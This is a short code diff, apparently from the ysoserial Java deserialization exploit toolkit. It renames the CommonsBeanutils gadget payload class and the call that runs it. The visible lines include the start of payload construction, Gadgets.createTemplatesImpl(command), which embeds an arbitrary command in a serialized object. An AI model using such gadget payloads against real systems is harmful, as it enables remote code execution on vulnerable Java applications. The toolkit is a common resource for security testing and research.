@@ -12,7 +12,7 @@ import ysoserial.payloads.util.Reflections;
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
-public class CommonsBeanutilsCollectionsLogging1 implements ObjectPayload<Object> {
+public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
@@ -37,6 +37,6 @@ public class CommonsBeanutilsCollectionsLogging1 implements ObjectPayload<Object
 	}
 
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsBeanutilsCollectionsLogging1.class, args);
+		PayloadRunner.run(CommonsBeanutils1.class, args);
 	}
 }
